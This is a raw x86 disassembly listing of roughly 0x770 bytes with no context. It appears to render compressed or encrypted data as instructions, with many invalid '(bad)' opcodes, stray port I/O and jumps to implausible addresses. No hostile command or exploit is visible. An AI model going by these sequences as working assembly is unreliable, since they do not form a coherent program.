  40fe4d:	sub    al,0xb7
  40fe4f:	stc    
  40fe50:	pop    edx
  40fe51:	jl     0x40fe43
  40fe53:	ins    DWORD PTR es:[edi],dx
  40fe54:	add    BYTE PTR [esi-0x7],0xf
  40fe58:	(bad)  
  40fe59:	cmp    DWORD PTR [edx-0x373f71f2],esi
  40fe5f:	fdiv   DWORD PTR [ecx+0x48]
  40fe62:	or     al,0xa2
  40fe64:	dec    edx
  40fe65:	ret    0x2717
  40fe68:	jo     0x40fe85
  40fe6a:	mov    dl,0x60
  40fe6c:	mov    ebp,0x7527dc46
  40fe71:	jle    0x40fe42
  40fe73:	(bad)  
  40fe74:	jmp    0x40fe58
  40fe76:	popf   
  40fe77:	out    dx,al
  40fe78:	in     al,dx
  40fe79:	add    BYTE PTR [eax],al
  40fe7b:	add    BYTE PTR [eax],al
  40fe7d:	add    BYTE PTR [eax],al
  40fe7f:	outs   dx,DWORD PTR ds:[esi]
  40fe80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe81:	daa    
  40fe82:	jbe    0x40fe73
  40fe84:	idiv   DWORD PTR [edi-0x43]
  40fe87:	mov    ecx,0x1216f8af
  40fe8c:	push   cs
  40fe8d:	cmp    ebp,esp
  40fe8f:	sub    eax,DWORD PTR ds:0x7220001
  40fe95:	add    BYTE PTR [eax],al
  40fe97:	hlt    
  40fe98:	(bad)  
  40fe99:	mov    al,0x1d
  40fe9b:	jb     0x40fee1
  40fe9d:	mov    eax,?
  40fe9f:	mov    bl,0x52
  40fea1:	bound  ebx,QWORD PTR ds:0x7d14c2f4
  40fea7:	retf   
  40fea8:	cdq    
  40fea9:	mov    ch,0x8b
  40feab:	mov    esi,0x904f1e8d
  40feb0:	push   cs
  40feb1:	shr    BYTE PTR [ebp-0x10],1
  40feb4:	out    0x17,eax
  40feb6:	rol    BYTE PTR [edi-0x35],cl
  40feb9:	dec    esi
  40feba:	xchg   BYTE PTR [ebx-0x43],cl
  40febd:	mov    ?,WORD PTR [edi+0xc]
  40fec0:	mov    ds:0x49a87a3c,eax
  40fec5:	scas   eax,DWORD PTR es:[edi]
  40fec6:	test   DWORD PTR [edx-0x7f],edi
  40fec9:	cdq    
  40feca:	cmp    ebp,DWORD PTR [edx-0x4c]
  40fecd:	stc    
  40fece:	loope  0x40ff01
  40fed0:	leave  
  40fed1:	aas    
  40fed2:	cmp    DWORD PTR [eax+0x75aef971],ebx
  40fed8:	push   ecx
  40fed9:	cdq    
  40feda:	aam    0x85
  40fedc:	xor    DWORD PTR [ebx-0x6d],esi
  40fedf:	push   ebx
  40fee0:	push   edi
  40fee1:	cmp    edx,DWORD PTR [eax+0x3e]
  40fee4:	pop    eax
  40fee5:	(bad)  
  40fee6:	sub    dl,BYTE PTR [esi-0x69]
  40fee9:	pop    ebp
  40feea:	sub    bl,BYTE PTR [ebx+0x10]
  40feed:	ss xchg ecx,eax
  40feef:	xor    al,0x43
  40fef1:	aam    0x1a
  40fef3:	sub    al,0xd1
  40fef5:	adc    ch,BYTE PTR [ebx]
  40fef7:	sahf   
  40fef8:	sbb    al,0x5d
  40fefa:	rcr    DWORD PTR [ebx-0x73eb8a29],1
  40ff00:	outs   dx,BYTE PTR ds:[esi]
  40ff01:	or     dl,BYTE PTR [edx+0x21ea1f2a]
  40ff07:	je     0x40ff23
  40ff09:	pusha  
  40ff0a:	add    bl,bl
  40ff0c:	rcl    dh,0x61
  40ff0f:	cdq    
  40ff10:	push   ecx
  40ff11:	mov    ah,0x2e
  40ff13:	or     edx,DWORD PTR [edx]
  40ff15:	enter  0x3440,0xf1
  40ff19:	xchg   edi,eax
  40ff1a:	adc    eax,0x9bcd9c1b
  40ff1f:	pop    ecx
  40ff20:	jae    0x40fefa
  40ff22:	in     eax,dx
  40ff23:	mov    ds:0x2bc957b6,eax
  40ff28:	or     al,0x29
  40ff2a:	mov    ch,0x0
  40ff2c:	sub    eax,0x92851a00
  40ff31:	out    dx,al
  40ff32:	inc    edx
  40ff33:	out    dx,eax
  40ff34:	psrlq  mm7,mm0
  40ff37:	adc    bl,BYTE PTR [eax]
  40ff39:	sub    BYTE PTR [esi+0x41],0xdc
  40ff3d:	xchg   edx,eax
  40ff3e:	je     0x40ff9c
  40ff40:	div    cl
  40ff42:	je     0x40fef6
  40ff44:	fs cdq 
  40ff46:	leave  
  40ff47:	add    al,0x59
  40ff49:	xchg   edx,eax
  40ff4a:	dec    edx
  40ff4b:	jp     0x40ffc6
  40ff4d:	fisttp DWORD PTR [eax]
  40ff4f:	add    bh,0x21
  40ff52:	pop    ds
  40ff53:	sahf   
  40ff54:	mov    ebp,0xafe29755
  40ff59:	enter  0xbbf2,0xe3
  40ff5d:	adc    bh,BYTE PTR [ebx+edi*2-0x172f7c65]
  40ff64:	pop    edi
  40ff65:	loope  0x40ffda
  40ff67:	xchg   ebp,eax
  40ff68:	fist   DWORD PTR [edi+0x24]
  40ff6b:	(bad)  
  40ff6c:	(bad)  
  40ff6d:	and    DWORD PTR [ebx+0x2c92c99e],edx
  40ff73:	xchg   DWORD PTR [ebx-0x5c],edi
  40ff76:	mov    dl,0xfe
  40ff78:	add    al,0x45
  40ff7a:	dec    edi
  40ff7b:	or     DWORD PTR [ecx-0x7c63dce4],edi
  40ff81:	cld    
  40ff82:	pop    ss
  40ff83:	les    eax,FWORD PTR es:[ebx+0x69]
  40ff87:	pop    eax
  40ff88:	xchg   ebp,eax
  40ff89:	lds    esi,FWORD PTR [edi]
  40ff8b:	dec    ebp
  40ff8c:	sahf   
  40ff8d:	jg     0x40ff2e
  40ff8f:	ins    BYTE PTR es:[edi],dx
  40ff90:	popf   
  40ff91:	adc    DWORD PTR [edx+eiz*2+0x766be396],ebp
  40ff98:	fstp   DWORD PTR [ecx+0x5e]
  40ff9b:	std    
  40ff9c:	push   edx
  40ff9d:	push   ebp
  40ff9e:	mov    ebx,0x18f0850a
  40ffa3:	and    BYTE PTR [esi-0x43e43030],dl
  40ffa9:	lock stos BYTE PTR es:[edi],al
  40ffab:	and    al,BYTE PTR [ebx+0x7f]
  40ffae:	das    
  40ffaf:	out    0xc7,eax
  40ffb1:	xchg   ecx,eax
  40ffb2:	retf   
  40ffb3:	sub    esp,esi
  40ffb5:	fisub  DWORD PTR [ebx+0x4]
  40ffb8:	and    BYTE PTR [esi-0x5eb22e36],0xca
  40ffbf:	mov    cl,0x35
  40ffc1:	gs push edx
  40ffc3:	inc    edi
  40ffc4:	(bad)  
  40ffc5:	(bad)  [ebx-0x2f95ca74]
  40ffcb:	push   esi
  40ffcc:	jne    0x40ffa0
  40ffce:	test   eax,0x352e53c3
  40ffd3:	and    cl,BYTE PTR [eax]
  40ffd5:	xor    edi,DWORD PTR [ecx]
  40ffd7:	and    edi,ebx
  40ffd9:	xchg   BYTE PTR [edi+0xeab57a2],dl
  40ffdf:	scas   eax,DWORD PTR es:[edi]
  40ffe0:	out    dx,al
  40ffe1:	shr    BYTE PTR [ebp+0x467fa622],1
  40ffe7:	xlat   BYTE PTR ds:[ebx]
  40ffe8:	aam    0x12
  40ffea:	xor    eax,0xdd12a37e
  40ffef:	xchg   ebp,eax
  40fff0:	imul   DWORD PTR ds:[ebp+0x4dad352e]
  40fff7:	dec    esi
  40fff8:	popa   
  40fff9:	lods   al,BYTE PTR ds:[esi]
  40fffa:	call   0x954e1d33
  40ffff:	inc    BYTE PTR [ebp+0x76]
  410002:	dec    ecx
  410003:	loop   0x410070
  410005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410006:	mov    ecx,0xabbfdcdc
  41000b:	out    0x40,eax
  41000d:	shl    DWORD PTR [eax+ebx*8+0xf3f57d4],cl
  410014:	mov    edx,0x888303b7
  410019:	stos   DWORD PTR es:[edi],eax
  41001a:	mov    bh,0x99
  41001c:	inc    edx
  41001d:	inc    eax
  41001e:	cld    
  41001f:	add    BYTE PTR [eax+edx*8],bh
  410022:	xor    al,bl
  410024:	test   al,0x46
  410026:	mov    dl,0xcd
  410028:	inc    ecx
  410029:	test   al,0x88
  41002b:	push   0xb7d64150
  410030:	rol    BYTE PTR [ebp-0x6d23e06e],1
  410036:	sbb    eax,0x6cf53f10
  41003b:	mov    DWORD PTR [ecx],ebp
  41003d:	jo     0x40fff2
  41003f:	clc    
  410040:	or     esp,ebp
  410042:	popa   
  410043:	dec    eax
  410044:	fimul  WORD PTR [eax]
  410046:	sub    ebp,ebx
  410048:	sbb    ebx,DWORD PTR [esi]
  41004a:	imul   esp,DWORD PTR [ebx+0x52],0x29
  41004e:	or     DWORD PTR ds:0x37b1b432,edx
  410054:	inc    ebx
  410055:	mov    dh,0xa2
  410057:	ds mov ebp,0xb1d3e966
  41005d:	jb     0x410066
  41005f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410060:	push   0xa3d424d9
  410065:	fst    QWORD PTR [edi]
  410067:	out    dx,eax
  410068:	mov    ecx,DWORD PTR [ebp-0x56]
  41006b:	outs   dx,DWORD PTR ds:[esi]
  41006c:	stos   BYTE PTR es:[edi],al
  41006d:	clc    
  41006e:	xor    eax,0x1b255522
  410073:	push   edi
  410074:	aaa    
  410075:	(bad)  
  410076:	and    eax,0xcc3f386a
  41007b:	push   esp
  41007c:	pop    eax
  41007d:	jnp    0x4100bf
  41007f:	jnp    0x410078
  410081:	hlt    
  410082:	imul   ebp,DWORD PTR [edx+0x36959186],0x45
  410089:	ds push edi
  41008b:	mov    ds,WORD PTR [edx]
  41008d:	dec    eax
  41008e:	sti    
  41008f:	push   ss
  410090:	jge    0x4100f7
  410092:	mov    ds:0xe25ca487,al
  410097:	(bad)  
  410098:	cmovae ebx,ebp
  41009b:	aaa    
  41009c:	push   eax
  41009d:	dec    ecx
  41009e:	scas   eax,DWORD PTR es:[edi]
  41009f:	and    dl,BYTE PTR [edx+0x705d48b4]
  4100a5:	fidiv  DWORD PTR [ebx+0x31c31eb5]
  4100ab:	int3   
  4100ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100ad:	sub    eax,0xb189931a
  4100b2:	mov    esp,0xe73c59ea
  4100b7:	add    DWORD PTR [edi-0x15],ebp
  4100ba:	dec    edx
  4100bb:	push   edi
  4100bc:	mov    eax,0x3147308e
  4100c1:	cmp    al,ah
  4100c3:	pushf  
  4100c4:	mul    dh
  4100c6:	and    BYTE PTR [ebx-0x56fb9acd],0x0
  4100cd:	arpl   bp,bp
  4100cf:	aad    0x6e
  4100d1:	mov    esi,0x867a1a34
  4100d6:	cs jb  0x4100ac
  4100d9:	add    eax,DWORD PTR [esi-0x5eee6a0e]
  4100df:	ret    
  4100e0:	add    DWORD PTR [edx],esi
  4100e2:	push   cs
  4100e3:	xchg   BYTE PTR [ebx+eax*4+0x3f13bf61],dh
  4100ea:	cmp    dl,ch
  4100ec:	out    dx,al
  4100ed:	inc    edi
  4100ee:	js     0x4100b9
  4100f0:	fs ds pop edi
  4100f4:	out    0x4b,al
  4100f6:	adc    dl,BYTE PTR [esi]
  4100f8:	nop
  4100f9:	(bad)  
  4100fb:	mov    al,ds:0xb9c7983c
  410100:	sbb    BYTE PTR [edi+esi*8],ah
  410103:	push   eax
  410104:	(bad)  
  410105:	je     0x4100ef
  410107:	sbb    DWORD PTR [ecx-0x8],ecx
  41010a:	inc    ecx
  41010b:	nop
  41010c:	(bad)  
  41010e:	inc    ebx
  41010f:	jbe    0x410186
  410111:	mov    ecx,0x25d23f62
  410116:	xchg   esp,eax
  410117:	icebp  
  410118:	pop    esp
  410119:	pop    ss
  41011a:	clc    
  41011b:	add    eax,0xe0f8a04a
  410120:	shl    BYTE PTR [ebx],1
  410122:	fs pop edx
  410124:	cmp    edi,esp
  410126:	lahf   
  410127:	and    ebx,DWORD PTR [esi+0x3b]
  41012a:	das    
  41012b:	xor    ah,bh
  41012d:	and    bl,BYTE PTR [esi+0x4f85e1f3]
  410133:	add    BYTE PTR gs:[esi+0x43c5339c],dh
  41013a:	jp     0x410156
  41013c:	pop    ebx
  41013d:	push   es
  41013e:	inc    edx
  41013f:	test   DWORD PTR [edi+0x67],edx
  410142:	imul   ebx,DWORD PTR [ecx],0xb5b49a00
  410148:	mov    ch,0x48
  41014a:	pusha  
  41014b:	jbe    0x41012b
  41014d:	add    DWORD PTR [edx+0x55],0x6c54fa14
  410154:	inc    edi
  410155:	mov    BYTE PTR ds:0x399cca71,dh
  41015b:	mov    esp,0x8aba8f96
  410160:	test   BYTE PTR [eax-0x11],cl
  410163:	pop    esi
  410164:	mov    ss,WORD PTR [eax]
  410166:	icebp  
  410167:	cld    
  410168:	stos   BYTE PTR es:[edi],al
  410169:	lahf   
  41016a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41016b:	shl    BYTE PTR fs:[ebp-0x139681a],1
  410172:	sub    DWORD PTR [ebp+ebx*2-0xf4a374f],0xee253bc9
  41017d:	xor    cl,BYTE PTR [ebx*4-0x3f72c800]
  410184:	imul   ecx,edi,0x3aaded41
  41018a:	daa    
  41018b:	mov    ch,0x29
  41018d:	xor    al,0xa1
  41018f:	add    al,0x3
  410191:	and    esp,DWORD PTR [ebp+eiz*1-0x216713e3]
  410198:	or     cl,dh
  41019a:	das    
  41019b:	mov    ?,WORD PTR [ebx-0xc854bd]
  4101a1:	into   
  4101a2:	(bad)  
  4101a4:	les    ebx,FWORD PTR [edx]
  4101a6:	fdiv   QWORD PTR [ebx+0x483b5e8f]
  4101ad:	repz dec edi
  4101af:	imul   ebx,DWORD PTR [esi-0xd],0xc22c5d72
  4101b6:	jmp    0x33284ddd
  4101bb:	lods   al,BYTE PTR ds:[esi]
  4101bc:	xor    DWORD PTR [edx-0x463dbeb2],ecx
  4101c2:	dec    esp
  4101c3:	jmp    0x4101d6
  4101c5:	xchg   BYTE PTR [ecx],al
  4101c7:	(bad)  
  4101c8:	pop    ss
  4101c9:	dec    ebp
  4101ca:	fiadd  WORD PTR [ecx-0xbb8f781]
  4101d0:	pop    ebp
  4101d1:	mov    bl,0xf8
  4101d3:	inc    ebx
  4101d4:	mov    eax,ds:0x3a86230b
  4101d9:	out    dx,al
  4101da:	(bad)  
  4101dc:	pop    ds
  4101dd:	pushf  
  4101de:	sub    esp,DWORD PTR [edi+0x10]
  4101e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101e2:	rcr    DWORD PTR [eax-0x2affa289],0xc0
  4101e9:	clc    
  4101ea:	loop   0x4101d4
  4101ec:	pop    eax
  4101ed:	outs   dx,BYTE PTR ds:[esi]
  4101ee:	push   edx
  4101ef:	(bad)  
  4101f0:	pop    esp
  4101f1:	lea    ecx,[edx-0x52]
  4101f4:	xchg   esi,eax
  4101f5:	pmulhuw mm2,mm2
  4101f8:	sub    esi,edi
  4101fa:	ror    esi,cl
  4101fc:	mov    esi,0x5a26d1d6
  410201:	fxch   st(3)
  410203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410204:	pushf  
  410205:	and    ebx,ecx
  410207:	cmp    DWORD PTR [ebp+0x7d28c535],ebp
  41020d:	adc    DWORD PTR [esi],0x6c1f1dea
  410213:	sbb    bh,BYTE PTR [edi-0x723a8034]
  410219:	cmp    esp,DWORD PTR [esi+ebx*2]
  41021c:	sbb    eax,DWORD PTR [esi+0x533a7151]
  410222:	bound  esi,QWORD PTR [edi+0x3c]
  410225:	nop
  410226:	push   0x63
  410228:	jg     0x41025f
  41022a:	pop    edi
  41022b:	adc    ebx,DWORD PTR [eax]
  41022d:	dec    ebp
  41022e:	ins    BYTE PTR es:[edi],dx
  41022f:	in     al,0xaf
  410231:	xor    ecx,edx
  410233:	iret   
  410234:	stos   DWORD PTR es:[edi],eax
  410235:	mov    DWORD PTR [ecx-0x1e36e76c],ecx
  41023b:	pop    esp
  41023c:	fldenv [esi+0x56]
  41023f:	lds    esp,FWORD PTR [ecx-0x60d57632]
  410245:	ss call 0x2a9c:0x4c5c9a17
  41024d:	dec    esp
  41024e:	lds    ebx,FWORD PTR [eax]
  410250:	pop    edx
  410251:	cli    
  410252:	out    0xb,eax
  410254:	lods   al,BYTE PTR ds:[esi]
  410255:	sbb    eax,0x48d78adf
  41025a:	sbb    BYTE PTR [edi-0x61f356a1],dh
  410260:	mov    cl,0xd0
  410262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410263:	sbb    DWORD PTR [eax-0x22247af1],ebp
  410269:	or     esp,DWORD PTR ds:0x32d9f649
  41026f:	add    eax,DWORD PTR [ecx+0x28390ecf]
  410275:	fisub  WORD PTR [edx]
  410277:	icebp  
  410278:	add    ebx,DWORD PTR [edi]
  41027a:	jnp    0x4102fa
  41027c:	mov    eax,ds:0xc8a85838
  410281:	dec    edx
  410282:	mov    ecx,0x5cc046c6
  410287:	imul   DWORD PTR ds:0xf475b855
  41028d:	cmp    BYTE PTR [eax+0xe966a99],0x8d
  410294:	jecxz  0x41029b
  410296:	(bad)  
  410297:	add    edi,DWORD PTR [ebx-0x2c]
  41029a:	es stc 
  41029c:	das    
  41029d:	push   ds
  41029e:	adc    bl,BYTE PTR [edi-0x36c26d83]
  4102a4:	mov    ds:0x5d4024d1,al
  4102a9:	or     eax,0x1c48d9b
  4102ae:	cmp    al,0xa4
  4102b0:	pop    es
  4102b1:	sbb    BYTE PTR [eax+edx*2],0xfc
  4102b5:	fwait
  4102b6:	adc    BYTE PTR [ebx],bh
  4102b8:	jo     0x4102b3
  4102ba:	mov    ds:0x5f061439,al
  4102bf:	call   0x56e8:0x56d1326f
  4102c6:	std    
  4102c7:	sti    
  4102c8:	mov    edi,0xc97512c2
  4102cd:	add    bh,dl
  4102cf:	sbb    esi,DWORD PTR [ecx+eiz*4]
  4102d2:	fcom   st(5)
  4102d4:	or     esp,DWORD PTR [edx-0x23]
  4102d7:	aad    0x10
  4102d9:	and    DWORD PTR [ebp-0x2a],ebp
  4102dc:	push   edx
  4102dd:	sbb    DWORD PTR [ebx+0x3b],edx
  4102e0:	push   edi
  4102e1:	(bad)  
  4102e2:	mov    esp,0xc886d471
  4102e7:	das    
  4102e8:	into   
  4102e9:	inc    esp
  4102ea:	jmp    0x7a7e8ca5
  4102ef:	test   ch,cl
  4102f1:	(bad)  
  4102f2:	xchg   ebx,eax
  4102f3:	and    al,0xf7
  4102f5:	dec    esi
  4102f6:	(bad)  
  4102f7:	jno    0x41028d
  4102f9:	jnp    0x410342
  4102fb:	or     al,0xc1
  4102fd:	out    dx,eax
  4102fe:	mov    ds:0x11b914b3,al
  410303:	cs mov edi,0xebdfa0cc
  410309:	pop    edi
  41030a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41030b:	aad    0x60
  41030d:	mov    fs,WORD PTR [ebp-0x2a]
  410310:	and    ebp,DWORD PTR [eax]
  410312:	push   ebx
  410313:	pop    ds
  410314:	loopne 0x410386
  410316:	mov    dl,BYTE PTR [edx]
  410318:	jbe    0x410373
  41031a:	dec    ebp
  41031b:	cmc    
  41031c:	sbb    eax,DWORD PTR [esi+0x2b046c9]
  410322:	xor    al,0x30
  410324:	pop    es
  410325:	cmp    BYTE PTR [esi-0x30ec26f0],dh
  41032b:	mov    ss,WORD PTR [esi+0x10]
  41032e:	pop    esp
  41032f:	rol    DWORD PTR [ebp-0x7a],1
  410332:	mov    cl,0xb1
  410334:	mov    esi,0x4734ca13
  410339:	jp     0x41037c
  41033b:	leave  
  41033c:	mov    cl,0x16
  41033e:	sbb    eax,DWORD PTR [esp+esi*8+0x13]
  410342:	enter  0x51ee,0x5f
  410346:	das    
  410347:	mov    dh,0x34
  410349:	les    eax,FWORD PTR [esi+eiz*4]
  41034c:	lds    edi,FWORD PTR [ebp+eiz*4+0x2326d98a]
  410353:	adc    DWORD PTR [ecx],edx
  410355:	xchg   ebx,eax
  410356:	sbb    dh,cl
  410358:	sub    esi,DWORD PTR [edi-0x4a]
  41035b:	sub    BYTE PTR fs:[eax],bl
  41035e:	dec    ebp
  41035f:	les    eax,FWORD PTR [ebx+0x12]
  410362:	ret    
  410363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410364:	(bad)  
  410365:	daa    
  410366:	inc    ecx
  410367:	sub    dl,BYTE PTR [edi]
  410369:	push   esp
  41036a:	jl     0x410303
  41036c:	inc    ebp
  41036d:	(bad)  
  41036f:	pop    edi
  410370:	and    bh,cl
  410372:	out    0x25,al
  410374:	icebp  
  410375:	jle    0x41030b
  410377:	jp     0x410378
  410379:	out    dx,al
  41037a:	in     al,dx
  41037b:	push   ds
  41037c:	addr16 cld 
  41037e:	mov    al,ds:0x5cc8b540
  410383:	adc    al,0x9f
  410385:	(bad)  
  410386:	js     0x4103aa
  410388:	sbb    edx,DWORD PTR [edi]
  41038a:	inc    ebp
  41038b:	mov    ah,0x4f
  41038d:	retf   0x7ee1
  410390:	xor    BYTE PTR [ecx],dh
  410392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410393:	stos   DWORD PTR es:[edi],eax
  410394:	cmp    DWORD PTR [ecx+0x26],esi
  410397:	inc    edx
  410398:	rcl    DWORD PTR [ebp-0x7e],1
  41039b:	fsub   st,st(3)
  41039d:	xchg   cx,ax
  41039f:	repz popa 
  4103a1:	xchg   DWORD PTR [esi],edi
  4103a3:	jns    0x4103f8
  4103a5:	mov    dh,0x83
  4103a7:	mov    esi,0x55b9ab90
  4103ac:	cmp    ebx,DWORD PTR [edi+0x6f]
  4103af:	jle    0x4103f2
  4103b1:	sar    DWORD PTR [esi],cl
  4103b3:	(bad)  
  4103b5:	inc    ecx
  4103b6:	cwde   
  4103b7:	jnp    0x4103fc
  4103b9:	sub    edi,DWORD PTR [esp+edx*4]
  4103bc:	push   0xfffffff6
  4103be:	ret    
  4103bf:	rcr    ah,1
  4103c1:	jecxz  0x410414
  4103c3:	mov    esi,0x46627a8c
  4103c8:	std    
  4103c9:	jno    0x4103ef
  4103cb:	pop    ecx
  4103cc:	cmp    BYTE PTR [edi+ebp*2],cl
  4103cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103d0:	clc    
  4103d1:	fwait
  4103d2:	mov    WORD PTR [ecx+esi*1-0x33],?
  4103d6:	pop    eax
  4103d7:	test   al,0x13
  4103d9:	pop    ecx
  4103da:	lea    ecx,[edx-0x6f64bc25]
  4103e0:	xlat   BYTE PTR ds:[ebx]
  4103e1:	loop   0x4103e1
  4103e3:	ds std 
  4103e5:	les    ebp,FWORD PTR [ebx+0x4]
  4103e8:	pop    ecx
  4103e9:	push   ebx
  4103ea:	mov    al,0xb9
  4103ec:	popa   
  4103ed:	and    DWORD PTR [esi],ebp
  4103ef:	(bad)  
  4103f0:	jg     0x41037d
  4103f2:	sub    ebp,DWORD PTR [edx+0x53fc5cb9]
  4103f8:	into   
  4103f9:	sahf   
  4103fa:	rol    ah,1
  4103fc:	stos   DWORD PTR es:[edi],eax
  4103fd:	(bad)  
  4103fe:	addr16 push esp
  410400:	test   ebx,eax
  410402:	out    0x0,eax
  410404:	aam    0x5e
  410406:	sbb    DWORD PTR [edx-0x726998cc],esp
  41040c:	mov    cl,0xf9
  41040e:	jno    0x41046a
  410410:	call   0xadd0:0x5c127bb4
  410417:	sahf   
  410418:	sub    BYTE PTR [edx+0x79abff31],dh
  41041e:	jnp    0x4103e9
  410420:	xlat   BYTE PTR ds:[ebx]
  410421:	scas   eax,DWORD PTR es:[edi]
  410422:	cmp    DWORD PTR [ebx+0x6e],eax
  410425:	stos   DWORD PTR es:[edi],eax
  410426:	ror    edx,cl
  410428:	push   cs
  410429:	jge    0x41047a
  41042b:	les    edi,FWORD PTR ds:0xeb12df9d
  410431:	push   esp
  410432:	push   edx
  410434:	pop    ds
  410435:	clc    
  410436:	std    
  410437:	sub    esi,ecx
  410439:	mov    ?,WORD PTR [esi+0x2f]
  41043c:	jns    0x4103ee
  41043e:	pushf  
  41043f:	or     BYTE PTR [eax+edi*2+0x7d],0xd7
  410444:	test   al,0x1f
  410446:	fild   WORD PTR [edx-0x12f005da]
  41044c:	xchg   ebp,eax
  41044d:	jnp    0x9228a813
  410453:	mov    al,0x8
  410455:	fdivr  st(5),st
  410457:	xchg   edx,eax
  410458:	mov    ecx,0xb2918c3e
  41045d:	imul   edx,DWORD PTR [esi+0x3f],0x3fe36b8
  410464:	lock pop edx
  410466:	xor    dl,BYTE PTR [ebx]
  410468:	fnsave [ebp-0x5dbe6495]
  41046e:	pop    ds
  41046f:	ins    DWORD PTR es:[edi],dx
  410470:	push   0x57
  410472:	pop    esi
  410473:	loopne 0x4104e1
  410475:	push   edi
  410476:	imul   ebp,DWORD PTR [ebp+0x47],0xffffffcd
  41047a:	inc    ebp
  41047b:	daa    
  41047c:	das    
  41047d:	bound  esi,QWORD PTR [edi]
  41047f:	jnp    0x41045e
  410481:	fild   DWORD PTR [edi]
  410483:	or     eax,0xd11dd806
  410488:	stc    
  410489:	pushf  
  41048a:	scas   al,BYTE PTR es:[edi]
  41048b:	clc    
  41048c:	mov    sp,WORD PTR [edx-0x3d]
  410490:	jp     0x410439
  410492:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  410494:	mov    edi,0x46b4ad51
  410499:	mov    edi,0xeac79b91
  41049e:	(bad)  
  41049f:	shl    DWORD PTR [ecx],1
  4104a1:	add    al,0x89
  4104a3:	cmp    eax,0x8c9fa117
  4104a8:	shr    edx,cl
  4104aa:	out    0x8e,eax
  4104ac:	in     al,0x5e
  4104ae:	enter  0x973,0xbe
  4104b2:	loopne 0x41049b
  4104b4:	xchg   esi,eax
  4104b5:	call   0x3634:0x7ce24f5a
  4104bc:	pop    esi
  4104bd:	pop    ebx
  4104be:	bound  ebx,QWORD PTR [ebx]
  4104c0:	xchg   edx,eax
  4104c1:	xor    BYTE PTR [edx-0x4a],al
  4104c4:	push   esp
  4104c5:	loope  0x41045c
  4104c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104c8:	out    0xdd,eax
  4104ca:	or     eax,DWORD PTR [edx+eax*2-0x4cd9fa7d]
  4104d1:	shl    eax,0xf0
  4104d4:	ffree  st(7)
  4104d6:	add    BYTE PTR [eax],ah
  4104d8:	sub    DWORD PTR [esi-0x1e9f4654],0xfffffff8
  4104df:	mov    bl,0x63
  4104e1:	daa    
  4104e2:	xchg   ebp,eax
  4104e3:	popa   
  4104e4:	pushf  
  4104e5:	ret    0xce65
  4104e8:	shl    DWORD PTR [ebx+0x54],0xf5
  4104ec:	push   ebx
  4104ed:	push   0xffffffce
  4104ef:	js     0x41054c
  4104f1:	jns    0x410490
  4104f3:	sub    ebp,DWORD PTR [esi]
  4104f5:	test   eax,0x53961e0
  4104fa:	push   ecx
  4104fb:	cdq    
  4104fc:	fcmovnb st,st(6)
  4104fe:	and    cl,bl
  410500:	adc    DWORD PTR [ecx-0x458b9669],esi
  410506:	ret    
  410507:	in     al,dx
  410508:	int3   
  410509:	fsubr  st(7),st
  41050b:	sub    al,0x1e
  41050d:	inc    eax
  41050e:	sbb    BYTE PTR [esi],cl
  410510:	sbb    al,ch
  410512:	xchg   esi,eax
  410513:	sbb    al,0x74
  410515:	scas   al,BYTE PTR es:[edi]
  410516:	pop    ebp
  410517:	scas   eax,DWORD PTR es:[edi]
  410518:	dec    ecx
  410519:	leave  
  41051a:	sahf   
  41051b:	cmp    ecx,DWORD PTR [ecx]
  41051d:	leave  
  41051e:	sti    
  41051f:	sbb    BYTE PTR [edx+ebx*4-0x3],ah
  410523:	mov    WORD PTR [edx+0x7bb3df7a],ss
  410529:	(bad)  
  41052a:	and    dl,bh
  41052c:	and    ebp,DWORD PTR [edx]
  41052e:	jecxz  0x41053b
  410530:	ret    
  410531:	adc    DWORD PTR [ebx],edi
  410533:	popa   
  410534:	or     BYTE PTR [edx],0x53
  410537:	pop    ss
  410538:	sub    BYTE PTR [ebp-0x7c],ah
  41053b:	mov    bh,0xb9
  41053d:	jle    0x41053e
  41053f:	sub    DWORD PTR [ebp-0x7fe69d8d],eax
  410545:	sbb    al,0x1b
  410547:	pop    edi
  410548:	fmulp  st(0),st
  41054a:	lock cmc 
  41054c:	dec    edx
  41054d:	jbe    0x410516
  41054f:	aaa    
  410550:	neg    BYTE PTR [esi+0x60]
  410553:	mov    esi,0x6899d1d
  410558:	std    
  410559:	push   ebx
  41055a:	dec    ebp
  41055b:	mov    dh,0xd3
  41055d:	pop    esi
  41055e:	das    
  41055f:	loope  0x410516
  410561:	mov    ss,WORD PTR [edi-0xf]
  410564:	xchg   ecx,eax
  410565:	xor    al,BYTE PTR [ebp+0x74]
  410568:	jp     0x4105d0
  41056a:	les    edx,FWORD PTR [eax]
  41056c:	aaa    
  41056d:	aam    0x3f
  41056f:	ret    0xc3f3
  410572:	rcr    DWORD PTR fs:[esi],1
  410575:	adc    cl,BYTE PTR [edi-0x327743ba]
  41057b:	mov    al,ds:0xa781fc6b
  410580:	jns    0x410589
  410582:	sub    esi,DWORD PTR [ecx-0x7f7ec5a]
  410588:	fisubr WORD PTR [ebp-0x4b]
  41058b:	repz (bad) 
  41058d:	ss jg  0x41055f
  410590:	push   DWORD PTR [ebx+0x16]
  410593:	ss in  al,0x7d
  410596:	push   esi
  410597:	push   cs
  410598:	sub    DWORD PTR [esi+0x61399d94],0x7ffe6c8a
  4105a2:	pop    esp
  4105a3:	sub    bh,BYTE PTR [ebx+0x6a]
  4105a6:	push   edi
  4105a7:	cmp    bh,bl
  4105a9:	pop    esp
  4105aa:	inc    eax
  4105ab:	cmp    al,0x35
  4105ad:	out    0x5f,eax
  4105af:	lock pop ebp
  4105b1:	enter  0xec7b,0x1b
  4105b5:	adc    al,al
  4105b7:	cli    
  4105b8:	add    BYTE PTR fs:[eax],al
  4105bb:	add    BYTE PTR [eax],al
